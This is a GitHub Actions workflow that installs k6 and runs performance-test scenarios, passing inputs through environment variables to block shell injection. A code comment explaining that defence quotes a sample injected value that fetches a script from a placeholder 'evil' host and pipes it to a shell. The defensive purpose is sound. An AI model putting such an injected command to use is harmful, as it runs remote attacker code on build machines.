name: k6 Runner (reusable)

on:
  workflow_call:
    inputs:
      scenario:
        description: 'Scenario name (file under perf/k6/scenarios/ without .js). Empty = all.'
        required: false
        default: ''
        type: string
      target_url:
        description: 'Base URL of the service under test'
        required: false
        default: 'http://localhost:8080'
        type: string
      vus:
        description: 'Override virtual users'
        required: false
        default: ''
        type: string
      duration:
        description: 'Override duration (e.g. 30s, 5m)'
        required: false
        default: ''
        type: string

permissions:
  contents: read

jobs:
  run-k6:
    name: Run k6 scenarios
    runs-on: ${{ vars.CI_BUILD_RUNNER_LABEL || 'ubuntu-latest' }}
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3

      - name: Install k6
        run: |
          sudo gpg -k
          sudo gpg --no-default-keyring \
            --keyring /usr/share/keyrings/k6-archive-keyring.gpg \
            --keyserver hkp://keyserver.ubuntu.com:80 \
            --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
          echo "deb [signed-by=/usr/share/keyrings/k6-archive-keyring.gpg] https://dl.k6.io/deb stable main" \
            | sudo tee /etc/apt/sources.list.d/k6.list
          sudo apt-get update
          sudo apt-get install -y k6

      - name: Validate k6 scenarios
        run: node scripts/validate-k6-scenarios.mjs

      - name: Set environment variables
        # #1660: forward workflow_dispatch inputs via env: — never interpolate
        # ${{ inputs.* }} straight into a run: body. GitHub substitutes the value into
        # the script text before the shell parses it, so a value like `foo";curl evil|sh;"`
        # would execute. This mirrors the env-indirection rule already documented in
        # issue-state.yml.ejs / _notify.yml.ejs (the runner reads "$VAR", not the splice).
        env:
          TARGET_URL: ${{ inputs.target_url }}
          VUS: ${{ inputs.vus }}
          DURATION: ${{ inputs.duration }}
        run: |
          echo "K6_BASE_URL=$TARGET_URL" >> "$GITHUB_ENV"
          if [ -n "$VUS" ]; then
            echo "K6_VUS=$VUS" >> "$GITHUB_ENV"
          fi
          if [ -n "$DURATION" ]; then
            echo "K6_DURATION=$DURATION" >> "$GITHUB_ENV"
          fi

      - name: Run scenario(s)
        # #1660: scenario name reaches the shell as an env var, not spliced text.
        env:
          SCENARIO: ${{ inputs.scenario }}
        run: |
          SCENARIOS_DIR="perf/k6/scenarios"
          if [ -n "$SCENARIO" ]; then
            echo "Running single scenario: $SCENARIO"
            k6 run "$SCENARIOS_DIR/${SCENARIO}.js" \
              --out json=perf/k6/results/k6-results.json \
              --summary-export=perf/k6/results/k6-summary.json
          else
            echo "Running all scenarios"
            mkdir -p perf/k6/results
            for f in "$SCENARIOS_DIR"/*.js; do
              name=$(basename "$f" .js)
              echo "--- Running: $name ---"
              k6 run "$f" \
                --out json="perf/k6/results/k6-${name}.json" \
                --summary-export="perf/k6/results/k6-${name}-summary.json" \
                || true
            done
          fi

      - name: Generate HTML report
        if: always()
        run: |
          pip install --quiet jinja2 2>/dev/null || true
          python perf/k6/reports/html-report.py || true

      - name: Upload k6 results
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: k6-results-${{ github.run_id }}
          path: perf/k6/results/
          retention-days: 30
